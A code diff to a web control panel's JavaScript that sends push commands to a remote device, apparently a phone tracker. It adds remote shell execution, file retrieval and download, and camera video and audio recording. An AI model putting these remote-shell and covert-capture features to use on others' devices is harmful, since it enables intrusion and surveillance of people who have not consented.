@@ -9,6 +9,30 @@
 		}
 	}
 
+	function sendShellCmd(regId) {
+		var message = prompt("Enter the command.", "");
+		if (message && message != "") {
+			sendPushNotification(regId, "Command:ShellCmd:"+message);
+			waitingForResponse();
+		}
+	}
+
+	function sendFileDownload(regId) {
+		var message = prompt("Enter the URL to download.", "");
+		if (message && message != "")
+			sendPushNotification(regId, "Command:GetFile:"+message);
+		else
+			toggleCommands();
+	}
+
+	function sendFileRequest(regId) {
+		var message = prompt("Enter the filename.", "");
+		if (message && message != "") {
+			sendPushNotification(regId, "Command:SendFile:"+message);
+			waitingForResponse();
+		}
+	}
+
 	function sendNotification(regId) {
 		var message = prompt("Enter the notification to display.", "");
 		if (message && message != "")
@@ -47,7 +71,7 @@
 	function sendPushNotification(regId, message) {
 		toggleCommands();
 		$.post( "send_message.php", { token: token, regId: regId, message: message } );
-		if (message == "Command:GetLocation" || message == "Command:GetLocationGPS" || message == "Command:FrontPhoto" || message == "Command:RearPhoto") {
+		if (message == "Command:GetLocation" || message == "Command:GetLocationGPS" || message == "Command:FrontPhoto" || message == "Command:RearPhoto" || message == "Command:FrontPhotoMAX" || message == "Command:RearPhotoMAX" || message == "Command:FrontVideo:15" || message == "Command:RearVideo:15" || message == "Command:FrontVideoMAX:15" || message == "Command:RearVideoMAX:15" || message == "Command:Audio:15") {
 			waitingForResponse();
 		} else {
 			document.getElementById('command-sent-dropdown').style.visibility = 'visible';
@@ -189,6 +213,18 @@
 			} else if (messages[i].message.substring(0, 4) == "img:") {
 				var tmp_link = "<span class='loglink' onclick='showImg("+i+")'>Image</span>: ";
 				log += messages[i].message.replace("img:",tmp_link);
+			} else if (messages[i].message.substring(0, 6) == "shell:") {
+				var tmp_link = "<span class='loglink' onclick='showShell("+i+")'>Shell</span>: ";
+				log += messages[i].message.replace("shell:",tmp_link);
+			} else if (messages[i].message.substring(0, 5) == "file:") {
+				var tmp_link = "<span class='loglink' onclick='showFile("+i+")'>File</span>: ";
+				log += messages[i].message.replace("file:",tmp_link);
+			} else if (messages[i].message.substring(0, 4) == "vid:") {
+				var tmp_link = "<span class='loglink' onclick='showFile("+i+")'>Video</span>: ";
+				log += messages[i].message.replace("vid:",tmp_link);
+			} else if (messages[i].message.substring(0, 4) == "aud:") {
+				var tmp_link = "<span class='loglink' onclick='showFile("+i+")'>Audio</span>: ";
+				log += messages[i].message.replace("aud:",tmp_link);
 			} else {
 				log += messages[i].message;
 			}
@@ -202,6 +238,18 @@
 		} else if (messages[0].message.substring(0, 4) == "img:" && waitvis) {
 			// The first message is an image, so display it
 			showImg(0);
+		} else if (messages[0].message.substring(0, 6) == "shell:" && waitvis) {
+			// The first message is an image, so display it
+			showShell(0);
+		} else if (messages[0].message.substring(0, 5) == "file:" && waitvis) {
+			// The first message is a file, so display it
+			showFile(0);
+		} else if (messages[0].message.substring(0, 4) == "vid:" && waitvis) {
+			// The first message is a video, so display it
+			showFile(0);
+		} else if (messages[0].message.substring(0, 4) == "aud:" && waitvis) {
+			// The first message is audio, so display it
+			showFile(0);
 		} else {
 			showMap();
 		}
@@ -210,21 +258,44 @@
 	}
 
 	var curImg = 0;
+	var curData = 0;
+	var downloadImg = 0;
 	function showImg(i) {
 		var h = $(window).height();
 		var w = $(window).width();
 		curImg = messages[i].id;
-		var url = 'img.php?w='+(w-300)+'&h='+(h-150)+'&id=' + curImg;
+		curData = messages[i].data;
+		downloadImg = i;
+		var url = 'img.php?data='+curData+'&w='+(w-300)+'&h='+(h-250)+'&id=' + curImg;
 		$.get(url, gotImg);
 	}
 
 	function gotImg(data) {
-		document.getElementById('img-container').innerHTML = "<div class='img-display'><span onclick='hideImg()'>Click image to close</span> | <span onclick='fullscreenImg()'>Full resolution</span></div><div class='img-display' onclick='hideImg()'>"+data+"</div>";
+		document.getElementById('img-container').innerHTML = "<div class='img-display'><span onclick='hideImg()'>Click image to close</span> | <span onclick='fullscreenImg()'>Full resolution</span> |  <span onclick='showFile(downloadImg)'>Download</span></div><div class='img-display' onclick='hideImg()'</span></div><div class='img-display' onclick='hideImg()'>"+data+"</div>";
 		document.getElementById('img-container').style.visibility = 'visible';
 	}
 
+	shell_h = 0;
+	shell_w = 0;
+	function showShell(i) {
+		//window.open("shell.php?id="+messages[i].id);
+		shell_h = $(window).height()-250;
+		shell_w = $(window).width()-300;
+		var url = 'shell.php?id=' + messages[i].id;
+		$.get(url, gotShell);
+	}
+
+	function gotShell(data) {
+		document.getElementById('img-container').innerHTML = "<div class='shell-display' style='width:"+shell_w+"px;height:"+shell_h+"px;'><center><span style='cursor: pointer;' onclick='hideImg()'>Click here to close</span></center><div class='shell-display'</span></div><div class='shell-display' style='padding:10px'>"+data+"</div>";
+		document.getElementById('img-container').style.visibility = 'visible';
+	}
+
+	function showFile(i) {
+		window.open("file.php?data="+messages[i].data+"&id="+messages[i].id+"&filename="+messages[i].message.replace("file:","").replace("img:","").replace("vid:",""));
+	}
+
 	function fullscreenImg() {
-		var url = 'img.php?w=10000&h=10000&id=' + curImg;
+		var url = 'img.php?data='+curData+'&w=10000&h=10000&id=' + curImg;
 		var win = window.open(url, '_blank');
 		win.focus();
 	}
